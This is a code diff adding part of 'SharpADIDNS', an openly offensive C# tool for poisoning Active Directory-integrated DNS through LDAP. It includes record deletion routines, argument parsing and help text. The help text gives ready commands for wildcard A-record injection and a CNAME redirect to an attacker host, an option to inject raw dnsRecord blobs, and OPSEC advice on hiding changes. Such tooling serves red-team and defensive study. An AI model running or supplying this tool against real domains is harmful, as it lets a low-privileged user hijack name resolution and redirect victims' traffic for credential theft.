+                    node.Properties["dNSTombstoned"].Value = true;
+                else
+                    node.Properties["dNSTombstoned"].Add(true);
+
+                node.CommitChanges();
+
+                Logger.Ok("Tombstoned node (soft delete)");
+                Logger.Ok("DN: {0}", nodeDn);
+                Logger.Info(opt, "The dnsNode object remains; DNS scavenging removes it after the");
+                Logger.Info(opt, "DsTombstoneInterval (default 14 days on Server 2008+).");
+            }
+            return ExitCodes.Success;
+        }
+
+        // ------------- remove (hard delete) -------------
+        public static int RunRemove(Options opt, string zoneDn)
+        {
+            string nodeDn = "DC=" + LdapOps.EscapeRdn(opt.Name) + "," + zoneDn;
+            Logger.Verbose(opt, "Node DN:    {0}", nodeDn);
+
+            int comma = nodeDn.IndexOf(',');
+            if (comma < 0)
+                throw new ArgumentException("Invalid DN: " + nodeDn);
+            string parentDn = nodeDn.Substring(comma + 1);
+
+            using (DirectoryEntry parent = LdapOps.Open(opt, parentDn))
+            {
+                DirectoryServicesCOMException parentErr;
+                if (!LdapOps.TryBind(parent, out parentErr))
+                {
+                    if (ErrorReporter.IsNotFound(parentErr))
+                        Logger.Err("Parent (zone) not found: {0}", parentDn);
+                    else
+                        ErrorReporter.PrintCom(parentErr);
+                    return ErrorReporter.ToExitCode(parentErr);
+                }
+
+                using (DirectoryEntry node = LdapOps.Open(opt, nodeDn))
+                {
+                    DirectoryServicesCOMException err;
+                    // B5 fix: distinguish not-found from access-denied
+                    if (!LdapOps.TryBind(node, out err))
+                    {
+                        if (ErrorReporter.IsNotFound(err))
+                        {
+                            Logger.Err("Node not found: {0}", nodeDn);
+                            return ExitCodes.NotFound;
+                        }
+                        ErrorReporter.PrintCom(err);
+                        return ErrorReporter.ToExitCode(err);
+                    }
+
+                    parent.Children.Remove(node);
+                    parent.CommitChanges();
+
+                    Logger.Ok("Removed node (hard delete)");
+                    Logger.Ok("DN: {0}", nodeDn);
+                }
+            }
+            return ExitCodes.Success;
+        }
+
+        private static void SetTombstoneFalse(DirectoryEntry node)
+        {
+            if (node.Properties.Contains("dNSTombstoned"))
+                node.Properties["dNSTombstoned"].Value = false;
+            else
+                node.Properties["dNSTombstoned"].Add(false);
+        }
+
+        private static void PrintProperty(DirectoryEntry entry, string name)
+        {
+            if (!entry.Properties.Contains(name) || entry.Properties[name].Count == 0)
+            {
+                Console.WriteLine("[*] {0}: <empty>", name);
+                return;
+            }
+
+            Console.Write("[*] {0}: ", name);
+            for (int i = 0; i < entry.Properties[name].Count; i++)
+            {
+                if (i > 0) Console.Write(", ");
+                object value = entry.Properties[name][i];
+                byte[] bytes = value as byte[];
+                if (bytes != null)
+                    Console.Write(Convert.ToBase64String(bytes));
+                else
+                    Console.Write(value);
+            }
+            Console.WriteLine();
+        }
+
+        private static string Prop(SearchResult r, string name)
+        {
+            if (!r.Properties.Contains(name) || r.Properties[name].Count == 0) return "";
+            return r.Properties[name][0].ToString();
+        }
+    }
+
+    // -----------------------------------------------------------------------
+    // CLI parsing and help
+    // -----------------------------------------------------------------------
+    internal sealed class Options
+    {
+        // Action
+        public string Action;
+        public bool   ShowHelp;
+
+        // Targeting
+        public string Zone;
+        public string Name;
+        public string DomainDn;
+        public string Partition = "DomainDnsZones";
+        public string Server;
+
+        // Record data
+        public string RecordType = "A";
+        public string Data;
+        public int    Ttl = 600;
+        public string RawBase64;
+        public bool   Force;
+
+        // Auth
+        public string Username;
+        public string Password;
+        public bool   Ldaps;
+
+        // Output
+        public bool Verbose;
+        public bool Quiet;
+
+        private static readonly HashSet<string> KnownActions =
+            new HashSet<string>(StringComparer.OrdinalIgnoreCase)
+            { "enum", "query", "add", "disable", "remove" };
+
+        public static Options Parse(string[] args)
+        {
+            Options o = new Options();
+
+            for (int i = 0; i < args.Length; i++)
+            {
+                string a = args[i];
+
+                if (KnownActions.Contains(a))
+                {
+                    if (o.Action != null)
+                        Logger.Warn("Multiple actions given, using last: {0}", a);
+                    o.Action = a.ToLowerInvariant();
+                    continue;
+                }
+
+                if (a == "-h" || a == "--help" || a == "/?" || a == "/help")
+                {
+                    o.ShowHelp = true;
+                    continue;
+                }
+
+                if (a == "--zone"        && i + 1 < args.Length) o.Zone       = args[++i];
+                else if (a == "--name"   && i + 1 < args.Length) o.Name       = args[++i];
+                else if ((a == "--data" || a == "--ip") && i + 1 < args.Length) o.Data = args[++i];
+                else if (a == "--type"   && i + 1 < args.Length) o.RecordType = args[++i];
+                else if (a == "--raw"    && i + 1 < args.Length) o.RawBase64  = args[++i];
+                else if (a == "--domain-dn" && i + 1 < args.Length) o.DomainDn = args[++i];
+                else if (a == "--partition" && i + 1 < args.Length) o.Partition = args[++i];
+                else if (a == "--server" && i + 1 < args.Length) o.Server     = args[++i];
+                else if (a == "--ttl"    && i + 1 < args.Length)
+                {
+                    string raw = args[++i];
+                    int ttl;
+                    if (!int.TryParse(raw, out ttl) || ttl < 1 || ttl > 604800)
+                        throw new ArgumentException("--ttl must be an integer in 1..604800 (got: " + raw + ")");
+                    o.Ttl = ttl;
+                }
+                else if (a == "--username" && i + 1 < args.Length) o.Username = args[++i];
+                else if (a == "--password" && i + 1 < args.Length) o.Password = args[++i];
+                else if (a == "--ldaps")                            o.Ldaps    = true;
+                else if (a == "--force")                            o.Force    = true;
+                else if (a == "-v" || a == "--verbose")             o.Verbose  = true;
+                else if (a == "-q" || a == "--quiet")               o.Quiet    = true;
+                else
+                    Logger.Warn("Ignored unknown argument: {0}", a);
+            }
+
+            // Cross-arg validation
+            if (!string.IsNullOrEmpty(o.Username) && o.Password == null)
+                throw new ArgumentException("--username requires --password");
+
+            return o;
+        }
+
+        // ----- Help -----
+        public static void PrintUsage()
+        {
+            PrintHeader();
+            PrintSynopsis();
+            PrintActions();
+            PrintTargeting();
+            PrintRecordData();
+            PrintAuth();
+            PrintOutput();
+            PrintExitCodes();
+            PrintExamples();
+            PrintNotes();
+        }
+
+        private static void PrintHeader()
+        {
+            Console.WriteLine();
+            Console.WriteLine("SharpADIDNS  --  AD-Integrated DNS manipulation via LDAP");
+            Console.WriteLine();
+        }
+
+        private static void PrintSynopsis()
+        {
+            Console.WriteLine("USAGE");
+            Console.WriteLine("  SharpADIDNS.exe <action> [options]");
+            Console.WriteLine();
+        }
+
+        private static void PrintActions()
+        {
+            Console.WriteLine("ACTIONS");
+            Console.WriteLine("  enum                   List dnsNode objects under a zone");
+            Console.WriteLine("  query                  Read one dnsNode and decode its dnsRecord blob(s)");
+            Console.WriteLine("  add                    Create or update a record (A/AAAA/CNAME/TXT or raw)");
+            Console.WriteLine("  disable                Tombstone a node (soft delete, object preserved)");
+            Console.WriteLine("  remove                 Hard-delete the dnsNode object");
+            Console.WriteLine();
+        }
+
+        private static void PrintTargeting()
+        {
+            Console.WriteLine("TARGETING");
+            Console.WriteLine("  --zone <fqdn>          DNS zone, e.g. corp.local                       [required]");
+            Console.WriteLine("  --name <label>         Record name ('@' = apex, '*' = wildcard)        [required*]");
+            Console.WriteLine("  --domain-dn <DN>       Naming context, e.g. DC=corp,DC=local           [required]");
+            Console.WriteLine("  --partition <name>     DomainDnsZones (default) | ForestDnsZones | System");
+            Console.WriteLine("  --server <host>        Target DC FQDN or IP  (default: serverless bind)");
+            Console.WriteLine("                         * --name is not required for the 'enum' action");
+            Console.WriteLine();
+        }
+
+        private static void PrintRecordData()
+        {
+            Console.WriteLine("RECORD DATA  (add only)");
+            Console.WriteLine("  --type <T>             A | AAAA | CNAME | TXT                    (default: A)");
+            Console.WriteLine("  --data <value>         A/AAAA: IP literal");
+            Console.WriteLine("                         CNAME : target FQDN, e.g. attacker.corp.local");
+            Console.WriteLine("                         TXT   : up to 255 bytes of ASCII");
+            Console.WriteLine("                         (alias: --ip)");
+            Console.WriteLine("  --raw <base64>         Inject a pre-built dnsRecord blob; bypasses --type/--data");
+            Console.WriteLine("  --ttl <seconds>        TTL, 1..604800                            (default: 600)");
+            Console.WriteLine("  --force                Replace SAME-type records on existing node;");
+            Console.WriteLine("                         other record types on the same node are preserved");
+            Console.WriteLine();
+        }
+
+        private static void PrintAuth()
+        {
+            Console.WriteLine("AUTHENTICATION");
+            Console.WriteLine("  --username <user>      UPN or DOMAIN\\user      (default: current process token)");
+            Console.WriteLine("  --password <pwd>       Cleartext password      (required with --username)");
+            Console.WriteLine("  --ldaps                Bind over LDAPS (port 636)");
+            Console.WriteLine();
+        }
+
+        private static void PrintOutput()
+        {
+            Console.WriteLine("OUTPUT");
+            Console.WriteLine("  -v, --verbose          Print DNs, raw blobs, bind details");
+            Console.WriteLine("  -q, --quiet            Suppress [*] info lines");
+            Console.WriteLine("  -h, --help             Show this help");
+            Console.WriteLine();
+        }
+
+        private static void PrintExitCodes()
+        {
+            Console.WriteLine("EXIT CODES");
+            Console.WriteLine("  0   success");
+            Console.WriteLine("  1   usage / argument error");
+            Console.WriteLine("  2   LDAP / AD operation failed   (see stderr for ExtendedError)");
+            Console.WriteLine("  3   target object not found");
+            Console.WriteLine("  4   access denied");
+            Console.WriteLine();
+        }
+
+        private static void PrintExamples()
+        {
+            Console.WriteLine("EXAMPLES");
+            Console.WriteLine("  # Recon: enumerate every dnsNode in the zone");
+            Console.WriteLine("  SharpADIDNS.exe enum --zone redteamnotes.local --domain-dn DC=redteamnotes,DC=local --server dc01.redteamnotes.local");
+            Console.WriteLine();
+            Console.WriteLine("  # Read one record");
+            Console.WriteLine("  SharpADIDNS.exe query --zone redteamnotes.local --name fileserver --domain-dn DC=redteamnotes,DC=local");
+            Console.WriteLine();
+            Console.WriteLine("  # Wildcard A injection (classic ADIDNS poisoning)");
+            Console.WriteLine("  SharpADIDNS.exe add --zone redteamnotes.local --name \"*\" --type A --data 10.0.0.66 --domain-dn DC=redteamnotes,DC=local --ttl 600");
+            Console.WriteLine();
+            Console.WriteLine("  # AAAA record with explicit creds over LDAPS");
+            Console.WriteLine("  SharpADIDNS.exe add --zone redteamnotes.local --name web --type AAAA --data fe80::1 --domain-dn DC=redteamnotes,DC=local --server dc01.redteamnotes.local --username redteamnotes\\alice --password 'P@ss' --ldaps");
+            Console.WriteLine();
+            Console.WriteLine("  # CNAME redirect (preserves any AAAA on the same node)");
+            Console.WriteLine("  SharpADIDNS.exe add --zone redteamnotes.local --name printer --type CNAME --data attacker.redteamnotes.local --domain-dn DC=redteamnotes,DC=local --force");
+            Console.WriteLine();
+            Console.WriteLine("  # Soft-delete (tombstone) instead of hard remove");
+            Console.WriteLine("  SharpADIDNS.exe disable --zone redteamnotes.local --name wpad --domain-dn DC=redteamnotes,DC=local");
+            Console.WriteLine();
+        }
+
+        private static void PrintNotes()
+        {
+            Console.WriteLine("NOTES");
+            Console.WriteLine("  * Any authenticated domain user can create new dnsNode objects by");
+            Console.WriteLine("    default. Existing nodes are owned by their creator; modifying them");
+            Console.WriteLine("    requires explicit ACEs (creator, DnsAdmins, or a delegated ACL).");
+            Console.WriteLine("  * 'wpad' and 'isatap' are blocked by the DNS server's Global Query");
+            Console.WriteLine("    Block List (GQBL) since Server 2008 -- the record will exist in AD");
+            Console.WriteLine("    but the server refuses to answer queries. GQBL is a DNS-server");
+            Console.WriteLine("    registry setting, NOT visible via LDAP.");
+            Console.WriteLine("  * 'disable' (tombstone) is more OPSEC-friendly than 'remove': the");
+            Console.WriteLine("    object stays in AD with dNSTombstoned=TRUE and is scavenged by AD");
+            Console.WriteLine("    after the DsTombstoneInterval (default 14 days).");
+            Console.WriteLine("  * Wildcard ('*') records hijack every unresolved name in the zone.");
+            Console.WriteLine("    Use 'enum' first to confirm you are not stomping legitimate data.");
+            Console.WriteLine();
+        }
+    }
+}
